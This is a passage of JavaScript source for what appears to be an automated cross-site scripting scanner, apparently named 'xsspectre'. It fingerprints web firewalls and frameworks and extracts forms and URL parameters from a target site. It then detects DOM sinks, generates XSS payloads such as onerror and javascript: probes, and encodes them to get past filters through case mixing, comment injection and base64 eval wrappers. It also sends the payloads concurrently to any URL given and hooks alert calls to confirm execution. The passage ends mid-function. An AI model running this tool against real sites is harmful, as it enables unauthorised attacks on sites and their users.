      if (!matched) return { reflected: false, context: null, executable: false };
      const context = detectContext(responseText, matched) || 'html';
      const execCtx = ['html','tag-attr','attr-unquoted','attr-quoted','event-attr','url-attr','js','js-string'];
      return { reflected: true, context, executable: execCtx.includes(context) };
    };

    const detectWAF_impl = headers => {
      const h = {};
      if (headers) {
        try { Object.entries(headers).forEach(([k, v]) => { h[k.toLowerCase()] = Array.isArray(v) ? v.join(', ') : String(v); }); } catch {}
      }
      const wafs = [];
      if (h['cf-ray'] || /cloudflare/i.test(h['server'] || '')) wafs.push('Cloudflare');
      if (h['x-sucuri-id'] || /sucuri/i.test(h['server'] || '')) wafs.push('Sucuri');
      if (/mod_security|modsecurity/i.test(h['server'] || '') || h['x-mod-security']) wafs.push('ModSecurity');
      if (/akamai/i.test(h['server'] || '') || h['x-akamai-transformed']) wafs.push('Akamai');
      if (h['x-iinfo'] || /imperva|incapsula/i.test(h['server'] || '')) wafs.push('Imperva');
      if (h['x-amz-cf-id']) wafs.push('AWS CloudFront');
      if (h['x-azure-ref']) wafs.push('Azure Front Door');
      if (h['x-fastly-request-id']) wafs.push('Fastly');
      if (h['x-wordfence']) wafs.push('Wordfence');
      if (h['x-datadome']) wafs.push('DataDome');
      return Array.from(new Set(wafs));
    };

    const detectTech_impl = (html, headers) => {
      const tech = new Set();
      const h = {};
      if (headers) { try { Object.entries(headers).forEach(([k, v]) => { h[k.toLowerCase()] = String(v); }); } catch {} }
      if (h['server']) tech.add(h['server'].split(/[\s/]/)[0]);
      if (h['x-powered-by']) tech.add(String(h['x-powered-by']));
      if (/wp-content|wp-includes/i.test(html)) tech.add('WordPress');
      if (/drupal/i.test(html)) tech.add('Drupal');
      if (/joomla/i.test(html)) tech.add('Joomla');
      if (/__NEXT_DATA__/i.test(html)) tech.add('Next.js');
      if (/react/i.test(html)) tech.add('React');
      if (/angular/i.test(html)) tech.add('Angular');
      if (/vue\.js|__vue__/i.test(html)) tech.add('Vue');
      if (/jquery/i.test(html)) tech.add('jQuery');
      if (/dompurify/i.test(html)) tech.add('DOMPurify');
      if (/svelte/i.test(html)) tech.add('Svelte');
      if (/alpine/i.test(html)) tech.add('Alpine.js');
      if (/solid-js|solidjs/i.test(html)) tech.add('SolidJS');
      return Array.from(tech);
    };

    const detectDomSinks_impl = html => {
      const findings = [];
      const sinks = [
        { name: 'innerHTML', re: /\.innerHTML\s*=\s*([^;]+)/g, payload: '<img src=x onerror=alert(1)>' },
        { name: 'outerHTML', re: /\.outerHTML\s*=\s*([^;]+)/g, payload: '<img src=x onerror=alert(1)>' },
        { name: 'document.write', re: /document\.write(?:ln)?\s*\(\s*([^)]+)\s*\)/g, payload: '<img src=x onerror=alert(1)>' },
        { name: 'insertAdjacentHTML', re: /insertAdjacentHTML\s*\(\s*[^,]+,\s*([^)]+)\s*\)/g, payload: '<img src=x onerror=alert(1)>' },
        { name: 'eval', re: /\beval\s*\(\s*([^)]+)\s*\)/g, payload: '1);alert(1);//' },
        { name: 'Function', re: /new\s+Function\s*\(\s*([^)]+)\s*\)/g, payload: 'alert(1)' },
        { name: 'setTimeout', re: /setTimeout\s*\(\s*([^,]+)/g, payload: '1);alert(1);//' },
        { name: 'setInterval', re: /setInterval\s*\(\s*([^,]+)/g, payload: '1);alert(1);//' },
        { name: 'setAttribute', re: /setAttribute\s*\(\s*['"]([^'"]+)['"]\s*,\s*([^)]+)\s*\)/g, payload: 'onerror=alert(1)' },
        { name: 'createContextualFragment', re: /createContextualFragment\s*\(\s*([^)]+)\s*\)/g, payload: '<img src=x onerror=alert(1)>' },
        { name: 'jQuery.html', re: /\$\([^)]*\)\.html\s*\(\s*([^)]+)\s*\)/g, payload: '<img src=x onerror=alert(1)>' },
        { name: 'jQuery.append', re: /\$\([^)]*\)\.append\s*\(\s*([^)]+)\s*\)/g, payload: '<img src=x onerror=alert(1)>' },
        { name: 'location.assign', re: /location\.assign\s*\(\s*([^)]+)\s*\)/g, payload: 'javascript:alert(1)' },
        { name: 'location.replace', re: /location\.replace\s*\(\s*([^)]+)\s*\)/g, payload: 'javascript:alert(1)' },
        { name: 'srcdoc', re: /\.srcdoc\s*=\s*([^;]+)/g, payload: '<img src=x onerror=alert(1)>' },
        { name: 'dangerouslySetInnerHTML', re: /dangerouslySetInnerHTML\s*:\s*\{[^}]*__html\s*:\s*([^}]+)/g, payload: '<img src=x onerror=alert(1)>' }
      ];
      const sources = [
        { name: 'location.search', re: /location\.search/i },
        { name: 'location.hash', re: /location\.hash/i },
        { name: 'location.href', re: /location\.href/i },
        { name: 'document.URL', re: /document\.URL/i },
        { name: 'document.referrer', re: /document\.referrer/i },
        { name: 'window.name', re: /window\.name/i },
        { name: 'URLSearchParams', re: /URLSearchParams/i },
        { name: 'postMessage', re: /postMessage|addEventListener\s*\(\s*['"]message/i }
      ];
      const scriptRe = /<script\b[^>]*>([\s\S]*?)<\/script>/gi;
      let m;
      while ((m = scriptRe.exec(html)) !== null) {
        const body = m[1];
        for (const sink of sinks) {
          sink.re.lastIndex = 0;
          let sm;
          while ((sm = sink.re.exec(body)) !== null) {
            const expr = sm[1] || sm[0];
            for (const source of sources) {
              if (source.re.test(expr) || source.re.test(body.slice(0, 600))) {
                findings.push({ type: 'dom', sink: sink.name, source: source.name, payload: sink.payload, code: sm[0].slice(0, 160) });
                break;
              }
            }
          }
        }
      }
      return findings;
    };

    const ENCODERS = {
      'none': p => p,
      'url': p => { try { return encodeURIComponent(p); } catch { return p; } },
      'double-url': p => { try { return encodeURIComponent(encodeURIComponent(p)); } catch { return p; } },
      'html-entity': p => p.replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])),
      'html-entity-named': p => p.replace(/[<>"']/g, c => ({ '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&apos;' }[c])),
      'html-decimal': p => p.replace(/[<>"']/g, c => '&#' + c.charCodeAt(0) + ';'),
      'html-hex': p => p.replace(/[<>"']/g, c => '&#x' + c.charCodeAt(0).toString(16) + ';'),
      'hex-percent': p => Array.from(p).map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''),
      'unicode-escape': p => Array.from(p).map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join(''),
      'base64-url': p => { try { return 'eval(atob("' + btoa(p) + '"))'; } catch { return p; } },
      'case-mixed': p => Array.from(p).map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join(''),
      'comment-inject': p => p.replace(/onerror/gi, 'one/**/rror').replace(/onload/gi, 'onl/**/oad'),
      'backslash-hex': p => Array.from(p).map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''),
      'js-string-hex': p => p.replace(/[a-zA-Z]/g, c => '\\x' + c.charCodeAt(0).toString(16))
    };

    const CTX_TO_LIB_CTX = {
      'html': ['html'],
      'tag-attr': ['html','attr-unquoted','attr-quoted'],
      'attr-unquoted': ['attr-unquoted','attr-quoted','html'],
      'attr-quoted': ['attr-quoted','html','attr-unquoted'],
      'event-attr': ['js','js-string','html'],
      'url-attr': ['url-attr','html'],
      'style-attr': ['html'],
      'js': ['js','js-string','html'],
      'js-string': ['js-string','js','html'],
      'css': ['html'],
      'comment': ['html'],
      'textarea': ['html'],
      'title': ['html'],
      'unknown': ['html','attr-unquoted','attr-quoted','js','js-string','url-attr']
    };

    const PICK_BY_CTX = {
      'html': ['none','html-entity-named','case-mixed','html-decimal','html-hex'],
      'attr-quoted': ['none','html-entity','html-entity-named','case-mixed','html-decimal'],
      'attr-unquoted': ['none','html-entity','case-mixed'],
      'js-string': ['none','unicode-escape','backslash-hex','base64-url','js-string-hex'],
      'js': ['none','unicode-escape','backslash-hex','base64-url'],
      'url-attr': ['none','url','double-url','hex-percent','html-entity'],
      'event-attr': ['none','unicode-escape','backslash-hex','case-mixed'],
      'style-attr': ['none','case-mixed','comment-inject'],
      'comment': ['none','case-mixed'],
      'textarea': ['none','html-entity-named','case-mixed'],
      'title': ['none','html-entity-named','case-mixed'],
      'css': ['none','case-mixed'],
      'unknown': ['none','url','html-entity-named','unicode-escape','case-mixed','html-decimal']
    };

    const applyEncoder = (payload, encName) => {
      const fn = ENCODERS[encName];
      if (!fn) return payload;
      try { return fn(payload); } catch { return payload; }
    };

    const generateDiversePayloads_impl = contextHint => {
      const matchingKeys = CTX_TO_LIB_CTX[contextHint] || CTX_TO_LIB_CTX.unknown;
      const encs = PICK_BY_CTX[contextHint] || PICK_BY_CTX.unknown;
      const out = [];
      const seen = new Set();
      for (const bp of PAYLOAD_LIB) {
        const isMatching = matchingKeys.includes(bp.ctx);
        for (const enc of encs) {
          const key = `${bp.id}-${enc}`;
          if (seen.has(key)) continue;
          seen.add(key);
          out.push({ id: key, payload: applyEncoder(bp.p, enc), ctx: bp.ctx, encoding: enc, note: bp.note + (enc !== 'none' ? ` [${enc}]` : ''), matching: isMatching, priority: isMatching ? 1 : 0 });
        }
      }
      return out.filter(p => p.matching);
    };

    self.onmessage = async ev => {
      const data = ev.data || {};
      const { id, action } = data;
      if (action === 'init') {
        try { PAYLOAD_LIB = Array.isArray(data.payloadLib) ? data.payloadLib : []; initialized = true; }
        catch { PAYLOAD_LIB = []; }
        self.postMessage({ id, ok: true, action: 'init' });
        return;
      }
      const t0 = performance.now();
      try {
        switch (action) {
          case 'fetch': {
            const { url, options, payload } = data;
            const controller = new AbortController();
            const timer = setTimeout(() => controller.abort(), options.timeout || 8000);
            const res = await fetch(url, {
              method: options.method || 'GET',
              headers: options.headers || {},
              body: options.body || undefined,
              signal: controller.signal,
              redirect: 'follow',
              credentials: 'omit',
              cache: 'no-store'
            });
            clearTimeout(timer);
            const text = await res.text();
            const a = analyzeReflection(text, payload);
            self.postMessage({
              id, ok: true,
              status: res.status, length: text.length,
              elapsed: performance.now() - t0,
              reflected: a.reflected, context: a.context, executable: a.executable,
              html: (a.reflected && a.executable) ? text : null
            });
            return;
          }
          case 'detectWAF': {
            self.postMessage({ id, ok: true, wafs: detectWAF_impl(data.headers || {}) });
            return;
          }
          case 'detectTech': {
            self.postMessage({ id, ok: true, tech: detectTech_impl(data.html || '', data.headers || {}) });
            return;
          }
          case 'detectDomSinks': {
            self.postMessage({ id, ok: true, sinks: detectDomSinks_impl(data.html || '') });
            return;
          }
          case 'generateDiversePayloads': {
            if (!initialized && Array.isArray(data.payloadLib)) PAYLOAD_LIB = data.payloadLib;
            self.postMessage({ id, ok: true, payloads: generateDiversePayloads_impl(data.contextHint || 'unknown') });
            return;
          }
          default:
            self.postMessage({ id, ok: false, error: 'UNKNOWN_ACTION:' + action });
        }
      } catch (err) {
        self.postMessage({ id, ok: false, error: String((err && err.message) || err), elapsed: performance.now() - t0 });
      }
    };
  };

  const WorkerPool = {
    workers: [],
    idle: [],
    queue: [],
    pending: new Map(),
    nextId: 1,
    size: 0,
    sourceUrl: null,
    available: typeof Worker === 'function' && typeof Blob === 'function',

    _makeSource() {
      const src = `;(${_workerMain.toString()})();`;
      return URL.createObjectURL(new Blob([src], { type: 'application/javascript' }));
    },

    init(size) {
      if (!this.available) return;
      if (!this.sourceUrl) this.sourceUrl = this._makeSource();
      const hw = (typeof navigator !== 'undefined' && navigator.hardwareConcurrency) || 4;
      const profile = PROFILES[state.runtime.activeProfile] || PROFILES.low;
      const desired = size || profile.concurrent;
      const safeSize = Math.max(
        profile.minConcurrent,
        Math.min(desired, Math.max(profile.minConcurrent, hw * 6), profile.maxConcurrent)
      );
      this.resize(safeSize);
    },

    _spawn() {
      const w = new Worker(this.sourceUrl);
      w.onmessage = ev => this._onMessage(w, ev);
      w.onerror = ev => this._onError(w, ev);
      try { w.postMessage({ action: 'init', payloadLib: PAYLOAD_LIB }); } catch {}
      this.workers.push(w);
      this.idle.push(w);
    },

    resize(newSize) {
      if (!this.available) return;
      const profile = PROFILES[state.runtime.activeProfile] || PROFILES.low;
      newSize = Math.max(profile.minConcurrent, Math.min(profile.maxConcurrent, newSize | 0));
      while (this.workers.length < newSize) this._spawn();
      while (this.workers.length > newSize) {
        const w = this.workers.pop();
        const i = this.idle.indexOf(w);
        if (i >= 0) this.idle.splice(i, 1);
        try { w.terminate(); } catch {}
      }
      this.size = this.workers.length;
      this._drain();
    },

    _onMessage(worker, ev) {
      const data = ev.data || {};
      const entry = this.pending.get(data.id);
      if (entry) {
        this.pending.delete(data.id);
        entry.resolve(data);
      }
      if (this.idle.indexOf(worker) === -1) this.idle.push(worker);
      this._drain();
    },

    _onError(worker) {
      for (const [id, entry] of this.pending) {
        if (entry.worker === worker) {
          this.pending.delete(id);
          entry.resolve({ ok: false, error: 'WORKER_ERROR' });
        }
      }
      const i = this.workers.indexOf(worker);
      if (i >= 0) this.workers.splice(i, 1);
      const j = this.idle.indexOf(worker);
      if (j >= 0) this.idle.splice(j, 1);
      try { worker.terminate(); } catch {}
      if (this.sourceUrl && this.workers.length < this.size) this._spawn();
      this._drain();
    },

    _drain() {
      while (this.queue.length > 0 && this.idle.length > 0) {
        const task = this.queue.shift();
        const worker = this.idle.shift();
        const id = this.nextId++;
        this.pending.set(id, { resolve: task.resolve, worker });
        try { worker.postMessage({ id, ...task.data }); }
        catch (e) {
          this.pending.delete(id);
          task.resolve({ ok: false, error: String((e && e.message) || e) });
          this.idle.push(worker);
        }
      }
    },

    run(data) {
      if (!this.available) return Promise.resolve({ ok: false, error: 'WORKER_UNAVAILABLE' });
      return new Promise(resolve => {
        this.queue.push({ data, resolve });
        this._drain();
      });
    },

    terminate() {
      for (const w of this.workers) { try { w.terminate(); } catch {} }
      this.workers = [];
      this.idle = [];
      this.queue = [];
      this.pending.clear();
      if (this.sourceUrl) { try { URL.revokeObjectURL(this.sourceUrl); } catch {} this.sourceUrl = null; }
    }
  };

  const getNetworkApi = () => {
    try { return globalThis.__FreeUserProxy?.api?.proxy || null; } catch { return null; }
  };

  const prepareNetworkRequest = async (url, options = {}) => {
    const network = getNetworkApi();
    if (!network?.resolve) throw new Error('FreeUserProxy network API is not available.');
    return network.resolve(url, options);
  };

  const normalizeHeaders = headers => {
    const out = {};
    if (!headers) return out;
    try {
      if (headers instanceof Headers) headers.forEach((v, k) => { out[k.toLowerCase()] = v; });
      else Object.entries(headers).forEach(([k, v]) => { out[k.toLowerCase()] = Array.isArray(v) ? v.join(', ') : String(v); });
    } catch {}
    return out;
  };
  const resolveUrl = (u, base) => { try { return new URL(u, base).href; } catch { return base; } };
  const normalizeTarget = input => {
    let url = String(input || '').trim();
    if (!url) throw new Error('TARGET_REQUIRED');
    if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
    try { return new URL(url).href; } catch { throw new Error('INVALID_TARGET'); }
  };

  const hashText = (s) => {
    const str = String(s || '');
    let h = 5381;
    const lim = Math.min(str.length, 8192);
    for (let i = 0; i < lim; i++) h = ((h << 5) + h) ^ str.charCodeAt(i);
    return h >>> 0;
  };

  const buildBaseline = async (targetUrl, timeoutMs) => {
    try {
      const u = new URL(targetUrl);
      const origin = `${u.protocol}//${u.host}`;
      const rootUrl = `${origin}/`;
      const nfUrl = `${origin}/__xsspectre_nf_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 10)}`;
      const [root, nf] = await Promise.all([
        fetchText(rootUrl, { timeout: timeoutMs }, 0).catch(() => ''),
        fetchText(nfUrl, { timeout: timeoutMs }, 0).catch(() => '')
      ]);
      return {
        rootHash: root ? hashText(root) : null,
        rootLen: root ? root.length : null,
        nfHash: nf ? hashText(nf) : null,
        nfLen: nf ? nf.length : null,
        rootUrl, nfUrl,
        rootStatus: root ? 200 : null,
        nfStatus: nf ? null : null
      };
    } catch {
      return { rootHash: null, rootLen: null, nfHash: null, nfLen: null };
    }
  };

  const isMirrorResponse = (text, baseline) => {
    if (!baseline || !text) return null;
    const h = hashText(text);
    const len = text.length;
    if (baseline.nfHash !== null && h === baseline.nfHash && (baseline.nfLen === null || len === baseline.nfLen)) return 'mirror-404';
    if (baseline.rootHash !== null && h === baseline.rootHash && (baseline.rootLen === null || len === baseline.rootLen)) return 'mirror-root';
    return null;
  };

  const DynamicWorkerAI = {
    current: DEFAULTS.concurrent,
    history: [],
    _lastAdjust: 0,
    adjust(metrics) {
      if (!state.settings.adaptiveWorkers) return this.current;
      const now = Date.now();
      if (now - this._lastAdjust < 800) return this.current;
      this._lastAdjust = now;
      const { avgLatency, errorRate, successRate, pending } = metrics;
      let target = this.current;
      if (errorRate > 0.45) target = Math.max(state.settings.minConcurrent, Math.floor(this.current * 0.6));
      else if (avgLatency > 6500) target = Math.max(state.settings.minConcurrent, Math.floor(this.current * 0.75));
      else if (successRate > 0.92 && avgLatency < 700 && pending > 80) target = Math.min(state.settings.maxConcurrent, Math.floor(this.current * 1.4));
      else if (successRate > 0.88 && avgLatency < 1500) target = Math.min(state.settings.maxConcurrent, Math.floor(this.current * 1.12));
      target = Math.max(state.settings.minConcurrent, Math.min(state.settings.maxConcurrent, target));
      if (Math.abs(target - this.current) >= 4) {
        const from = this.current;
        this.current = target;
        WorkerPool.resize(target);
        state.runtime.stats.workerAdjustments++;
        this.history.push({ from, to: target, ts: now });
        if (this.history.length > 30) this.history.shift();
      }
      state.runtime.stats.dynamicWorkers = this.current;
      return this.current;
    },
    reset() {
      const profile = PROFILES[state.runtime.activeProfile] || PROFILES.low;
      this.current = profile.concurrent;
      this.history = [];
      this._lastAdjust = 0;
      if (WorkerPool.available) WorkerPool.resize(this.current);
    }
  };

  const limitConcurrency = async (tasks, limit) => {
    const results = new Array(tasks.length);
    let idx = 0, latencySum = 0, latencyCount = 0, okCount = 0, errCount = 0;
    const n = Math.max(1, Math.min(limit, tasks.length || 1));
    const runners = new Array(n).fill(0).map(async () => {
      while (idx < tasks.length) {
        const i = idx++;
        const t0 = performance.now();
        try { results[i] = await tasks[i](); okCount++; }
        catch (e) { results[i] = { error: (e && e.message) || 'task-error' }; errCount++; }
        latencySum += performance.now() - t0; latencyCount++;
        if (latencyCount > 0 && latencyCount % 50 === 0) {
          DynamicWorkerAI.adjust({
            avgLatency: latencySum / latencyCount,
            errorRate: errCount / (okCount + errCount),
            successRate: okCount / (okCount + errCount),
            pending: tasks.length - idx
          });
        }
      }
    });
    await Promise.all(runners);
    return results;
  };

  const fetchWithRetry = async (url, options = {}, retries) => {
    const network = getNetworkApi();
    if (!network?.fetch) throw new Error('FreeUserProxy network API is not available.');
    const maxRetries = Number.isFinite(retries) ? Math.max(0, retries) : state.settings.retries;
    let lastErr = null;
    const started = performance.now();
    for (let attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        const response = await network.fetch(url, options);
        try { Object.defineProperty(response, '__elapsed', { value: performance.now() - started, configurable: true }); } catch {}
        state.runtime.stats.requests++;
        if (response.ok || response.status < 500) state.runtime.stats.success++;
        else state.runtime.stats.failures++;
        if (response.ok || response.status < 500) return response;
        lastErr = new Error(`HTTP ${response.status || 0}`);
      } catch (err) {
        lastErr = err;
        state.runtime.stats.failures++;
      }
      if (attempt < maxRetries) await sleep(40 + Math.random() * 60);
    }
    throw lastErr || new Error('FETCH_FAILED');
  };

  const fetchText = async (url, options = {}, retries) => {
    const res = await fetchWithRetry(url, options, retries);
    return res.text();
  };

  const fetchFull = async (url, options = {}, retries) => {
    const res = await fetchWithRetry(url, options, retries);
    const text = await res.text();
    return { text, status: res.status, headers: normalizeHeaders(res.headers), elapsed: res.__elapsed || 0 };
  };

  const fetchHeaders = async (url, options = {}, retries) => {
    const res = await fetchWithRetry(url, { method: 'HEAD', ...options }, retries);
    return { headers: normalizeHeaders(res.headers), status: res.status };
  };

  const detectWAF = async headers => {
    if (WorkerPool.available) {
      const r = await WorkerPool.run({ action: 'detectWAF', headers });
      if (r.ok && Array.isArray(r.wafs)) return r.wafs;
    }
    return [];
  };

  const detectTech = async (html, headers) => {
    if (WorkerPool.available) {
      const r = await WorkerPool.run({ action: 'detectTech', html, headers });
      if (r.ok && Array.isArray(r.tech)) return r.tech;
    }
    return [];
  };

  const detectDomSinks = async html => {
    if (WorkerPool.available) {
      const r = await WorkerPool.run({ action: 'detectDomSinks', html });
      if (r.ok && Array.isArray(r.sinks)) return r.sinks;
    }
    return [];
  };

  const generateDiversePayloadsAsync = async (contextHint = 'unknown') => {
    if (WorkerPool.available) {
      const r = await WorkerPool.run({ action: 'generateDiversePayloads', contextHint, payloadLib: PAYLOAD_LIB });
      if (r.ok && Array.isArray(r.payloads)) return r.payloads;
    }
    return [];
  };

  const extractForms = (html, baseUrl) => {
    const forms = [];
    if (typeof DOMParser === 'undefined') return forms;
    let doc;
    try { doc = new DOMParser().parseFromString(html, 'text/html'); } catch { return forms; }
    const collectInputs = root => {
      const inputs = [];
      root.querySelectorAll('input, textarea, select, [contenteditable="true"]').forEach(el => {
        const tag = el.tagName.toLowerCase();
        let type;
        if (tag === 'input') type = (el.getAttribute('type') || 'text').toLowerCase();
        else if (tag === 'textarea') type = 'textarea';
        else if (tag === 'select') type = 'select';
        else type = 'contenteditable';
        if (['submit','button','image','reset','file'].includes(type)) return;
        const name = el.getAttribute('name') || el.getAttribute('id') || '';
        if (!name) return;
        inputs.push({ name, type, value: el.getAttribute('value') || (el.textContent || '').trim() || '', tagName: tag });
      });
      return inputs;
    };
    doc.querySelectorAll('form').forEach(formEl => {
      const action = resolveUrl(formEl.getAttribute('action') || '', baseUrl);
      const method = (formEl.getAttribute('method') || 'GET').toUpperCase();
      const enctype = (formEl.getAttribute('enctype') || 'application/x-www-form-urlencoded').toLowerCase();
      const inputs = collectInputs(formEl);
      if (inputs.length > 0) forms.push({ action: action || baseUrl, method, enctype, inputs, html: formEl.outerHTML.slice(0, 800), kind: 'form' });
    });
    const standaloneInputs = [];
    doc.querySelectorAll('input, textarea, select, [contenteditable="true"]').forEach(el => {
      if (el.closest('form')) return;
      const tag = el.tagName.toLowerCase();
      let type;
      if (tag === 'input') type = (el.getAttribute('type') || 'text').toLowerCase();
      else if (tag === 'textarea') type = 'textarea';
      else if (tag === 'select') type = 'select';
      else type = 'contenteditable';
      if (['hidden','submit','button','image','reset','file'].includes(type)) return;
      const name = el.getAttribute('name') || el.getAttribute('id') || '';
      if (!name) return;
      standaloneInputs.push({ name, type, value: el.getAttribute('value') || '', tagName: tag });
    });
    if (standaloneInputs.length > 0) forms.push({ action: baseUrl, method: 'GET', enctype: 'application/x-www-form-urlencoded', inputs: standaloneInputs, html: '', kind: 'standalone' });
    return forms;
  };
  const detectUrlParams = url => {
    const params = [];
    try {
      const u = new URL(url);
      u.searchParams.forEach((value, name) => { params.push({ name, type: 'query', value, tagName: 'query' }); });
      if (u.hash && u.hash.length > 1) {
        const hash = u.hash.slice(1);
        if (/[?&].*=/.test(hash) || /=/.test(hash)) {
          try {
            const hp = new URLSearchParams(hash.replace(/^[?&]/, ''));
            hp.forEach((value, name) => { params.push({ name, type: 'hash', value, tagName: 'hash' }); });
          } catch { params.push({ name: 'hash', type: 'hash', value: u.hash, tagName: 'hash' }); }
        } else params.push({ name: 'hash', type: 'hash', value: u.hash, tagName: 'hash' });
      }
    } catch {}
    return params;
  };
  const discoverAllParams = (html, url) => {
    const found = new Map();
    const addParam = (name, source, kind = 'query') => {
      if (!name || typeof name !== 'string') return;
      if (name.length < 1 || name.length > 40) return;
      if (!/^[a-zA-Z_][a-zA-Z0-9_\-\[\]]*$/.test(name)) return;
      const key = `${kind}:${name}`;
      if (!found.has(key)) found.set(key, { name, type: kind, source, tagName: 'discovered' });
    };
    try {
      const u = new URL(url);
      u.searchParams.forEach((_, n) => addParam(n, 'url', 'query'));
      if (u.hash) {
        const hash = u.hash.replace(/^#/, '');
        const hp = new URLSearchParams(hash.startsWith('/') ? hash.slice(1) : hash);
        hp.forEach((_, n) => addParam(n, 'url-hash', 'hash'));
      }
    } catch {}
    const regexes = [
      { re: /[?&]([a-zA-Z_][a-zA-Z0-9_\-]*)=/g, src: 'html-url', kind: 'query' },
      { re: /name\s*=\s*["']([a-zA-Z_][a-zA-Z0-9_\-]*)["']/g, src: 'html-name', kind: 'query' },
      { re: /id\s*=\s*["']([a-zA-Z_][a-zA-Z0-9_\-]*)["']/g, src: 'html-id', kind: 'query' },
      { re: /searchParams\.get\(["']([a-zA-Z_][a-zA-Z0-9_\-]*)["']\)/g, src: 'js-searchParams', kind: 'query' },
      { re: /getParameter\(["']([a-zA-Z_][a-zA-Z0-9_\-]*)["']\)/g, src: 'js-getParameter', kind: 'query' },
      { re: /params\.([a-zA-Z_][a-zA-Z0-9_]*)/g, src: 'js-params', kind: 'query' },
      { re: /query\.([a-zA-Z_][a-zA-Z0-9_]*)/g, src: 'js-query', kind: 'query' }
    ];
    for (const rx of regexes) {
      let m;
      while ((m = rx.re.exec(html)) !== null) { addParam(m[1], rx.src, rx.kind); if (found.size > 100) break; }
    }
    return Array.from(found.values());
  };
  const scoreForm = form => {
    let score = 0;
    const names = form.inputs.map(i => (i.name || '').toLowerCase());
    const types = form.inputs.map(i => (i.type || '').toLowerCase());
    if (form.kind === 'standalone') score += 4;
    if (form.kind === 'query') score += 3;
    if (form.kind === 'hash') score += 2;
    if (form.kind === 'discovered') score += 1;
    if (form.method === 'POST') score += 2;
    if (types.includes('search')) score += 3;
    if (types.includes('text') || types.includes('url') || types.includes('email') || types.includes('textarea')) score += 2;
    if (names.some(n => /^(q|query|search|s|keyword|term|filter|find)$/i.test(n))) score += 4;
    if (names.some(n => /(comment|message|content|body|text|title|name|desc|reply|review|feedback|url|redirect|next|return|callback)/i.test(n))) score += 2;
    if (form.action && /(search|query|find|filter|comment|post|submit|message|feedback)/i.test(form.action)) score += 3;
    return score;
  };
  const classifyForm = form => {
    const sig = form.inputs.map(i => `${i.name} ${i.type}`.toLowerCase()).join(' ');
    if (/\bpassword\b|\bpass\b|\bpwd\b|\blogin\b|\bsignin\b|\bauth\b/.test(sig)) return 'login';
    if (/\bsearch\b|\bquery\b|\bq\b|\bkeyword\b|\bfind\b/.test(sig)) return 'search';
    if (/\bcomment\b|\breply\b|\breview\b|\bmessage\b|\bcontent\b|\bfeedback\b/.test(sig)) return 'comment';
    if (/\bemail\b|\bmail\b|\bcontact\b/.test(sig)) return 'contact';
    if (/\burl\b|\blink\b|\bredirect\b|\bnext\b|\breturn\b|\bcallback\b/.test(sig)) return 'redirect';
    return 'generic';
  };
  const detectAllForms = (html, baseUrl, urlParams, discoveredParams) => {
    const forms = extractForms(html, baseUrl);
    const urlForm = { action: baseUrl, method: 'GET', enctype: 'application/x-www-form-urlencoded', inputs: urlParams.filter(p => p.type === 'query'), html: '', kind: 'query' };
    const hashForm = { action: baseUrl, method: 'GET', enctype: 'application/x-www-form-urlencoded', inputs: urlParams.filter(p => p.type === 'hash'), html: '', kind: 'hash' };
    if (urlForm.inputs.length > 0) forms.push(urlForm);
    if (hashForm.inputs.length > 0) forms.push(hashForm);
    const knownNames = new Set();
    forms.forEach(f => f.inputs.forEach(i => knownNames.add(i.name.toLowerCase())));
    const discoveredOnly = discoveredParams.filter(p => !knownNames.has(p.name.toLowerCase()));
    if (discoveredOnly.length > 0) {
      const grouped = discoveredOnly.slice(0, 40).map(p => ({ name: p.name, type: 'text', value: '', tagName: 'discovered' }));
      forms.push({ action: baseUrl, method: 'GET', enctype: 'application/x-www-form-urlencoded', inputs: grouped, html: '', kind: 'discovered' });
    }
    return forms
      .map(f => ({ ...f, score: scoreForm(f), type: classifyForm(f) }))
      .filter(f => f.inputs.length > 0)
      .sort((a, b) => b.score - a.score);
  };

  const analyzeSurface = (forms, domSinks, urlParams, discoveredParams, tech) => {
    const s = {
      hasLogin: false, hasSearch: false, hasComment: false, hasRedirect: false, hasContact: false, hasGeneric: false,
      hasUrlParams: urlParams.length > 0,
      hasDiscoveredParams: discoveredParams.length > 0,
      hasDomSinks: domSinks.length > 0,
      hasForms: forms.length > 0,
      frameworks: new Set(tech.map(t => t.toLowerCase())),
      totalInputs: forms.reduce((a, f) => a + f.inputs.length, 0),
      formTypes: new Set()
    };
    for (const f of forms) {
      s.formTypes.add(f.type);
      if (f.type === 'login') s.hasLogin = true;
      else if (f.type === 'search') s.hasSearch = true;
      else if (f.type === 'comment') s.hasComment = true;
      else if (f.type === 'redirect') s.hasRedirect = true;
      else if (f.type === 'contact') s.hasContact = true;
      else s.hasGeneric = true;
    }
    s.anyExploitable = s.hasForms || s.hasDomSinks || s.hasUrlParams || s.hasDiscoveredParams;
    return s;
  };

  const shouldRunPayload = (payload, surface) => {
    if (!payload.requires) return true;
    if (payload.requires === 'any') return true;
    if (payload.requires === 'login') return surface.hasLogin;
    if (payload.requires === 'comment') return surface.hasComment;
    if (payload.requires === 'search') return surface.hasSearch;
    if (payload.requires === 'redirect') return surface.hasRedirect;
    return true;
  };

  const shouldRunCve = (cvePayload, surface) => {
    const fw = (cvePayload.framework || 'Generic').toLowerCase();
    if (fw === 'generic') return true;
    if (fw === 'webcomponents') return true;
    if (fw === 'trustedtypes') return true;
    if (fw === 'chrome') return true;
    return surface.frameworks.has(fw) ||
           (fw === 'angularjs' && surface.frameworks.has('angular')) ||
           (fw === 'dompurify' && surface.frameworks.has('dompurify'));
  };

  const HOOK_SCRIPT = '<script>(function(){try{var send=function(t,m){try{parent.postMessage({__xsspectre:t,msg:String(m||""),ts:Date.now()},"*")}catch(e){}};window.alert=function(m){send("ALERT",m);return true};window.confirm=function(m){send("ALERT",m);return true};window.prompt=function(m){send("ALERT",m);return null};window.print=function(){send("ALERT","print")};var oe=window.onerror;window.onerror=function(m,s,l,c,e){send("ERROR",String(m||""));if(oe)try{oe.apply(this,arguments)}catch(_){}};try{Object.defineProperty(window,"alert",{value:window.alert,configurable:false})}catch(e){}})();<\/script>';
  const injectHooksIntoResponse = html => {
